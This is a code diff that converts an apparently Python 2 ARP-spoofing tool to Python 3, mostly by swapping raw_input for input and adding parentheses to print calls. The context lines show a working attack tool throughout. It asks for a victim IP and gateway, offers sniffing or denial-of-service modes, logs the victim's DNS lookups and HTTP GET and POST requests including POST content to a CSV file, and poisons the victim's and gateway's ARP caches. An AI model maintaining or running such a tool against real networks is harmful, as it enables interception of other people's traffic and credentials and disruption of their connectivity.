@@ -75,7 +75,7 @@ def dns_sniff_request(pkt):
 		and pkt.getlayer(DNS).qr == 0
 	):
 		date = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
-		print(
+		print((
 			date
 			+ " Service: DNS"
 			+ " Victim: "
@@ -84,7 +84,7 @@ def dns_sniff_request(pkt):
 			+ pkt.getlayer(Ether).src
 			+ ") is resolving "
 			+ pkt.getlayer(DNS).qd.qname
-		)
+		))
 		if not SAVE_FILE_PATH == "":
 			utils.save_to_csv_file(
 				[
@@ -128,7 +128,7 @@ def http_sniff_get_request(pkt):
 				and not get_request == ""
 			):
 				date = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
-				print(
+				print((
 					date
 					+ " Service: HTTP_GET"
 					+ " Victim: "
@@ -138,7 +138,7 @@ def http_sniff_get_request(pkt):
 					+ ") is requiring document: "
 					+ host_request
 					+ get_request
-				)
+				))
 				if not SAVE_FILE_PATH == "":
 					utils.save_to_csv_file(
 						[
@@ -189,7 +189,7 @@ def http_sniff_post_request(pkt):
 				and not post_request == ""
 			):
 				date = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
-				print(
+				print((
 					date
 					+ " Service: HTTP_POST"
 					+ " Victim: "
@@ -202,7 +202,7 @@ def http_sniff_post_request(pkt):
 					+ post_request
 					+ " Content:"
 					+ post_content
-				)
+				))
 				if not SAVE_FILE_PATH == "":
 					utils.save_to_csv_file(
 						[
@@ -237,17 +237,17 @@ DEFAULT_GATEWAY_IP = "192.168.0.1"
 DEFAULT_INTERFACE = "wlan0"
 
 # receiving user input
-print("\n" + "=" * 20 + " TARGETS DEFINITION " + "=" * 20)
-V_IP = raw_input("Insert the IP address to attack: ")
-GW_IP = raw_input(
+print(("\n" + "=" * 20 + " TARGETS DEFINITION " + "=" * 20))
+V_IP = input("Insert the IP address to attack: ")
+GW_IP = input(
 	'Insert the gateway IP address [default "' + DEFAULT_GATEWAY_IP + '"]: '
 )
-INTERFACE = raw_input(
+INTERFACE = input(
 	'Insert the network interface name [default "' + DEFAULT_INTERFACE + '"]: '
 )
-print("=" * 20 + " ATTACK TYPE DEFINITION " + "=" * 20)
+print(("=" * 20 + " ATTACK TYPE DEFINITION " + "=" * 20))
 ATTACK_TYPE = 0
-ATTACK_TYPE_INPUT = raw_input(
+ATTACK_TYPE_INPUT = input(
 	"Choose tattack type:\n" + "\t[0, empty, invalid] SNIFF\n" + "\t[1] DOS\n"
 )
 try:
@@ -258,7 +258,7 @@ except ValueError:
 SNIFF_SERVICE = 0
 SAVE_FILE_PATH = ""
 if ATTACK_TYPE == ATTACK_TYPE_SNIFF:
-	SNIFF_SERVICE_INPUT = raw_input(
+	SNIFF_SERVICE_INPUT = input(
 		"Choose tattack type:\n"
 		+ "\t[0, empty, invalid] ALL AVAILABLE\n"
 		+ "\t[1] HTTP GET\n"
@@ -269,7 +269,7 @@ if ATTACK_TYPE == ATTACK_TYPE_SNIFF:
 		SNIFF_SERVICE = int(SNIFF_SERVICE_INPUT)
 	except ValueError:
 		pass
-	SAVE_FILE_PATH = raw_input(
+	SAVE_FILE_PATH = input(
 		"Save output file name or path (output file is a csv file) [empty means no saving file]: "
 	)
 
@@ -286,7 +286,7 @@ if ATTACK_TYPE == ATTACK_TYPE_SNIFF:
 		SERVICE_STRING = SNIFF_SERVICES[SNIFF_SERVICE]
 	except IndexError:
 		pass
-	print(
+	print((
 		"ATTACK RESUME: sniffing "
 		+ V_IP
 		+ " "
@@ -296,24 +296,24 @@ if ATTACK_TYPE == ATTACK_TYPE_SNIFF:
 		+ " from network interface "
 		+ INTERFACE
 		+ ""
-	)
+	))
 	_SAVE_FILE_ABSOLUTE_PATH = os.path.abspath(SAVE_FILE_PATH)
 	if not SAVE_FILE_PATH == "":
-		print("Saving output to file: " + _SAVE_FILE_ABSOLUTE_PATH)
+		print(("Saving output to file: " + _SAVE_FILE_ABSOLUTE_PATH))
 elif ATTACK_TYPE == ATTACK_TYPE_DOS:
-	print(
+	print((
 		"ATTACK RESUME: denying services for "
 		+ V_IP
 		+ " with gateway "
 		+ GW_IP
 		+ " from network interface "
 		+ INTERFACE
-	)
+	))
 else:
 	print("Fatal Error, ATTACK_TYPE not defined\nAborting...")
 	sys.exit(1)
 print("Type anything to start the attack:")
-raw_input()
+input()
 
 # getting victim and gateway mac address by iterating research until both are found
 print("Obtaining MAC addresses (may take a few attempts)...")
@@ -321,16 +321,16 @@ while True:
 	V_MAC = get_MACaddress(V_IP)
 	GW_MAC = get_MACaddress(GW_IP)
 	if V_MAC is None:
-		print("Cannot find victim MAC address (" + V_IP + "), retrying...")
+		print(("Cannot find victim MAC address (" + V_IP + "), retrying..."))
 	elif GW_MAC is None:
-		print("Cannot find victim MAC address (" + GW_IP + "), retrying...")
+		print(("Cannot find victim MAC address (" + GW_IP + "), retrying..."))
 	else:
 		break
 print("Attack targets have been found!")
 
 # showing ARP spoofing targets
-print("Victim: " + V_IP + " (" + V_MAC + ")")
-print("Gateway: " + GW_IP + " (" + GW_MAC + ")")
+print(("Victim: " + V_IP + " (" + V_MAC + ")"))
+print(("Gateway: " + GW_IP + " (" + GW_MAC + ")"))
 print("Poisoning victim and gateway...")
 
 # enable or disable IP forwarding
